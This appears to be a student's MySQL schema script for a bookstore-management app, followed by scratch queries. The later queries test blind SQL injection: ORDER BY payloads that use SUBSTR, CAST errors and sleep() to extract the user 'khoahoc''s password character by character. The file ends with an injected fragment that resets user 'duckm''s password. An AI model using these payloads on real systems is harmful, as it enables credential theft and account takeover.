DROP DATABASE FU_LABIA_BookStoreManagement;
 CREATE DATABASE FU_LABIA_BookStoreManagement ;
  
USE FU_LABIA_BookStoreManagement;

CREATE TABLE `User`(
	username varchar(50),
    `password` varchar(100),
    displayName nvarchar (150),
    dob date,
    email varchar(150),
    createDate date,
    lastActive datetime,
    avatarPath varchar(255),
    CONSTRAINT PK_User PRIMARY KEY (username)
);

CREATE TABLE `Role`(
	roleId int NOT NULL AUTO_INCREMENT,
	roleName varchar(50),
	CONSTRAINT PK_Role PRIMARY KEY (roleId)
);

CREATE TABLE User_Role(
	username varchar(50) NOT NULL,
	roleId int NOT NULL,
	CONSTRAINT PK_UserRole PRIMARY KEY (username, roleId)
);

ALTER TABLE User_Role ADD CONSTRAINT FK_UserRole_User FOREIGN KEY(username)
REFERENCES `User` (username);
ALTER TABLE User_Role ADD CONSTRAINT FK_UserRole_Role FOREIGN KEY(roleId)
REFERENCES `Role` (roleId);


CREATE TABLE Feature(
	featureId int NOT NULL AUTO_INCREMENT, 
	featureName varchar(150),
	url varchar(150),
	CONSTRAINT PK_Feature PRIMARY KEY (featureId)
);

CREATE TABLE Role_Feature 
(
	roleId int NOT NULL,
	featureId int NOT NULL,
	CONSTRAINT PK_RoleFeature PRIMARY KEY (roleId, featureId)
);
ALTER TABLE Role_Feature ADD CONSTRAINT FK_RoleFeature_Role FOREIGN KEY(roleId)
REFERENCES `Role`(roleId);
ALTER TABLE Role_Feature ADD CONSTRAINT FK_RoleFeature_Feature FOREIGN KEY(featureId)
REFERENCES Feature(featureId);


CREATE TABLE Book (
	bookId int NOT NULL AUTO_INCREMENT,
    title nvarchar(150),
    authorName nvarchar(150),
    `description` longtext,
    pdfPath varchar(255),
    coverPath varchar(255),
    price float,
    createdBy varchar(50),
    isApproved bit DEFAULT false,
    noSale int DEFAULT 0,
    noView int DEFAULT 0,
    CONSTRAINT PK_Book PRIMARY KEY (bookId)
);
ALTER TABLE Book ADD CONSTRAINT FK_Book_User FOREIGN KEY(createdBy)
REFERENCES `User` (username);

CREATE TABLE Category (
	categoryId int NOT NULL AUTO_INCREMENT,
    categoryName varchar(50),
    CONSTRAINT PK_Category PRIMARY KEY (categoryId)
);

CREATE TABLE Book_Category(
	bookId int NOT NULL , 
    categoryId int NOT NULL,
    CONSTRAINT PK_Book_Category PRIMARY KEY (bookId, categoryId)
);

ALTER TABLE Book_Category ADD CONSTRAINT FK_BookCategory_Book FOREIGN KEY(bookId)
REFERENCES Book (bookId);
ALTER TABLE Book_Category ADD CONSTRAINT FK_BookCategory_Category FOREIGN KEY(categoryId)
REFERENCES Category (categoryId);
select * from book b join user u on  b.createdBy = u.userName where b.createdBy  = 'maiphuonghoang'
/*
SELECT * FROM `User`;
SELECT * FROM `Role`;
SELECT * FROM Book;
SELECT * FROM Category;
SELECT * FROM Book_Category;
SELECT * FROM User_Role ;
SELECT * FROM Role_Feature;
*/
/*
 select
        * 
    from
        `User` u 
    where
        u.username not in (
            select
                us.username 
            from
                `User` us 
            join
                User_Role ur 
                    on us.username = ur.username 
            where
                ur.roleId = 1)
select * from `User` u where u.username not in (select us.username from `User` us join User_Role ur on us.username = ur.username where ur.roleId = 2 and us.username = 'maiphuonghoang' or ur.roleId = 1)
INSERT INTO `User`(username,`password`,displayName)
VALUES ('test','123','Em Yêu Khoa Học');
*/

/*
select * from `User` u join User_Role ru  on u.username = ru.username  where ru.roleId = 2 and u.username not in (select us.username from `User` us 
join User_Role ur on us.username = ur.username 
where ur.roleId = 2 and us.username = 'khoahoc' or ur.roleId = 1)

select * from `User` us WHERE us.username in (
select u.username from `User` u join User_Role ur  on u.username = ur.username GROUP BY u.username
HAVING  COUNT(roleId) = 1) 
*/
select * from `User`
select * from `User` ORDER BY (select CASE WHEN (1=0) THEN CAST('123' AS int) ELSE 1 END 
from `User` where username = 'khoahoc' and SUBSTR(password,1,1)='1') desc 

select * from `User` ORDER BY (select CAST((select CASE WHEN (1=0) THEN 'avd' ELSE 1 END 
from `User` where username = 'khoahoc' and SUBSTR(password,1,1)='1') AS UNSIGNED)) desc 
select * from `User` ORDER BY 'dndfj' desc
select * from `User` ORDER BY (IF(1 = 1, 'bvbn', 1)) desc
select * from `User` ORDER BY (select 0) desc
select * from `User` ORDER BY (select CAST('1' AS UNSIGNED) from `User`) desc
select * from `User` ORDER BY (select CAST((select CASE WHEN (1=1) THEN 0 ELSE 1 END 
from `User` where username = 'khoahoc' and SUBSTR(password,1,1)='1') AS UNSIGNED))  desc

(select CASE WHEN (1=1) THEN 0 ELSE 1 END 
from `User` where username = 'khoahoc' and SUBSTR(password,1,1)='1') 

select CASE WHEN 0 = 0 THEN CAST('123' AS int)
    ELSE 1/ NULLIF(2, 0)
END from `User` where username = 'khoahoc' and SUBSTR(password,1,1)='1'
 
select CASE WHEN (1=0) THEN (SELECT CAST(1 AS int) as a) ELSE 1 END 
from `User` where username = 'khoahoc' and SUBSTR(password,1,1)='1'

SELECT CAST('1' AS int) from `User`
select 1/0 from `User`
select CAST('abc' AS UNSIGNED) from `User`

(select CAST((select CASE WHEN (1=1) THEN 0 ELSE 1 END 
from `User` where username = 'khoahoc' and SUBSTR(password,1,1)='1') AS UNSIGNED)) 

DESCRIBE (SELECT CAST('1' AS int) AS result)
SHOW COLUMNS FROM (SELECT CAST('1' AS UNSIGNED) AS result);

select * from `User` ORDER BY (Cast(0 as UNSIGNED)) 

SELECT
  *
  IF(column3 = 0, (SELECT 1/0), column4) AS result
  
select * from `User` ORDER BY (select CASE WHEN (1=1) THEN sleep(10) ELSE 1 END 
from `User` where username = 'khoahoc' and SUBSTR(password,1,1)='1') desc 
  
  select * from `User` ORDER BY 1 d||e||sc
  
  select * from Book b where (b.isApproved = '1') and b.title LIKE '%a%' order by 
  CAST(select CASE WHEN (1=3) THEN sleep(10) ELSE '1' END 
from `User` where username = 'khoahoc' and SUBSTR(password,1,1)='1')  asc
select * from Book order by bookId 
DECLARE int @n;
SET @n =1;
SET @n := (select CASE WHEN (1=3) THEN sleep(10) ELSE '1' END 
from `User` where username = 'khoahoc' and SUBSTR(password,1,1)='1');
-- SELECT @n;
SELECT VAR_TYPE(@n) AS `Data_Type_of_n`;
DESCRIBE SELECT VAR_TYPE(@n);
DESCRIBE (select CASE WHEN (1=3) THEN sleep(10) ELSE '1' END 
from `User` where username = 'khoahoc' and SUBSTR(password,1,1)='1')

select CASE WHEN (1=1) THEN sleep(10) ELSE '1' END from `User`
',password= '1' where username = 'duckm' -- ' 
  

  




